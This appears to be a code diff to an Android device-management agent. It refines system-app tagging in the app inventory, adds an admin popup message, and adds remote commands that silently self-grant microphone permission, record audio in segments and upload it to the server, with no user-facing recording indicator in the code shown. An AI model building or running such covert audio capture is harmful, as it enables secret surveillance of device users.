@@ -49,6 +49,7 @@ class CommandExecutor @Inject constructor(
     private val collector: TelemetryCollector,
     private val integrity: IntegrityChecker,
     private val camera: CameraCapture,
+    private val audioStream: AudioStreamManager,
     private val locator: LocationFix,
     private val buzzer: Buzzer,
     private val resetTokens: ResetPasswordTokenStore,
@@ -276,18 +277,34 @@ class CommandExecutor @Inject constructor(
             // the admin UI filters client-side. The historical
             // `include_system` payload is now ignored; keeping the field
             // accepted for back-compat with older command callers.
+            //
+            // `system` here is NOT just FLAG_SYSTEM. Android's FLAG_SYSTEM is
+            // set on every app shipped in /system, /vendor or /product —
+            // which on a stock OEM phone means Chrome, Gmail, YouTube, Maps,
+            // Photos, the Play Store and ~80% of everything else. Tagging
+            // those as "system" buries the inventory under noise. Instead we
+            // tag an app as system only when it is BOTH preinstalled AND
+            // not user-facing (no launcher intent) AND has not been replaced
+            // by a user-installed update. That matches what a human means
+            // by "system app" — internal OS components and headless services.
             val pm = context.packageManager
             val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                 .asSequence()
                 .mapNotNull { info ->
                     val pi = runCatching { pm.getPackageInfo(info.packageName, 0) }.getOrNull() ?: return@mapNotNull null
+                    val rawSystem    = (info.flags and ApplicationInfo.FLAG_SYSTEM) != 0
+                    val updatedSystem = (info.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
+                    val launchable   = pm.getLaunchIntentForPackage(info.packageName) != null
+                    val isSystem     = rawSystem && !updatedSystem && !launchable
                     mapOf(
                         "package"        to info.packageName,
                         "label"          to pm.getApplicationLabel(info).toString(),
                         "version_name"   to (pi.versionName ?: ""),
                         "version_code"   to pi.versionCodeCompat(),
-                        "system"         to ((info.flags and ApplicationInfo.FLAG_SYSTEM) != 0),
-                        "updated_system" to ((info.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0),
+                        "system"         to isSystem,
+                        "preinstalled"   to rawSystem,
+                        "updated_system" to updatedSystem,
+                        "launchable"     to launchable,
                         "enabled"        to info.enabled,
                         "first_install"  to pi.firstInstallTime,
                         "last_update"    to pi.lastUpdateTime
@@ -350,6 +367,58 @@ class CommandExecutor @Inject constructor(
                     )
                 }
             }
+        }
+
+        CommandKind.START_AUDIO_STREAM -> {
+            val session = p.str("session_id")
+            val segmentSec = (p["segment_sec"] as? Number)?.toInt() ?: 5
+            val maxSec = (p["max_sec"] as? Number)?.toInt() ?: 300
+            // Auto-grant in DO mode; NOP in DA/none mode (there the user grants
+            // RECORD_AUDIO via the in-app Permissions panel).
+            dpm.grantRuntimePermission(context.packageName, android.Manifest.permission.RECORD_AUDIO)
+            // start() awaits the first segment and returns a failure reason (or
+            // null). Surfacing it makes a silent mic failure visible to the
+            // server instead of the command falsely reporting success.
+            val startErr = audioStream.start(session, segmentSec, maxSec) { bytes, seq ->
+                // Name encodes session + zero-padded sequence so the admin UI
+                // can group a session and play its segments in order:
+                //   audio_<session>_<seq>_<ts>.m4a
+                val seqPad = seq.toString().padStart(4, '0')
+                val fileName = "audio_${session}_${seqPad}_${System.currentTimeMillis()}.aac"
+                val body = bytes.toRequestBody("audio/aac".toMediaTypeOrNull())
+                val part = MultipartBody.Part.createFormData("file", fileName, body)
+                val kindBody = "audio".toRequestBody("text/plain".toMediaTypeOrNull())
+                val nameBody = fileName.toRequestBody("text/plain".toMediaTypeOrNull())
+                val resp = api.deviceUpload(part, kindBody, nameBody)
+                if (!resp.isSuccessful) {
+                    val eb = runCatching { resp.errorBody()?.string() }.getOrNull()?.take(180)
+                    Timber.w("audio upload failed HTTP ${resp.code()} seq=$seq body=$eb")
+                    // Throw so AudioStreamManager surfaces the failure in the
+                    // command result instead of the mic recording into the void.
+                    error("upload HTTP ${resp.code()}${if (eb.isNullOrBlank()) "" else ": $eb"}")
+                }
+            }
+            if (startErr != null) error(startErr)
+            mapOf(
+                "session_id"  to session,
+                "segment_sec" to segmentSec,
+                "max_sec"     to maxSec,
+                "started_at"  to nowIso()
+            )
+        }
+
+        CommandKind.STOP_AUDIO_STREAM -> {
+            val session = p["session_id"] as? String
+            audioStream.stop(session)
+            mapOf("session_id" to (session ?: "(all)"), "stopped_at" to nowIso())
+        }
+
+        CommandKind.SHOW_MESSAGE -> {
+            val title = (p["title"] as? String)?.takeIf { it.isNotBlank() } ?: "Message from IT"
+            val message = ((p["message"] as? String) ?: (p["text"] as? String)).orEmpty()
+            if (message.isBlank()) error("message is empty")
+            showMessagePopup(title, message)
+            mapOf("shown" to true, "title" to title, "at" to nowIso())
         }
 
         CommandKind.SET_FLASHLIGHT -> {
@@ -418,6 +487,45 @@ class CommandExecutor @Inject constructor(
 
     private fun nowIso(): String =
         java.time.OffsetDateTime.now(java.time.ZoneOffset.UTC).toString()
+
+    /**
+     * Surfaces an admin message on the device: a high-importance heads-up
+     * notification with a full-screen intent (pops over the screen, shows when
+     * locked), plus a best-effort direct launch of the dialog activity (which
+     * works as Device Owner / when the app is foregrounded). Between the two the
+     * message reaches the user across owner / admin / enrolled-only modes.
+     */
+    private fun showMessagePopup(title: String, message: String) {
+        val nm = context.getSystemService(android.app.NotificationManager::class.java)
+        val chId = "mdm_message"
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            val ch = android.app.NotificationChannel(chId, "Messages",
+                android.app.NotificationManager.IMPORTANCE_HIGH).apply {
+                description = "Messages from your IT administrator"
+            }
+            nm?.createNotificationChannel(ch)
+        }
+        val actIntent = android.content.Intent(context, MessageActivity::class.java).apply {
+            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            putExtra("title", title)
+            putExtra("message", message)
+        }
+        val piFlags = android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+        val pi = android.app.PendingIntent.getActivity(context, message.hashCode(), actIntent, piFlags)
+        val notif = androidx.core.app.NotificationCompat.Builder(context, chId)
+            .setSmallIcon(android.R.drawable.stat_sys_warning)
+            .setContentTitle(title)
+            .setContentText(message)
+            .setStyle(androidx.core.app.NotificationCompat.BigTextStyle().bigText(message))
+            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
+            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_MESSAGE)
+            .setAutoCancel(true)
+            .setFullScreenIntent(pi, true)
+            .setContentIntent(pi)
+            .build()
+        runCatching { nm?.notify(0xCAF1, notif) }
+        runCatching { context.startActivity(actIntent) }
+    }
 
     @Suppress("DEPRECATION")
     private fun PackageInfo.versionCodeCompat(): Long =
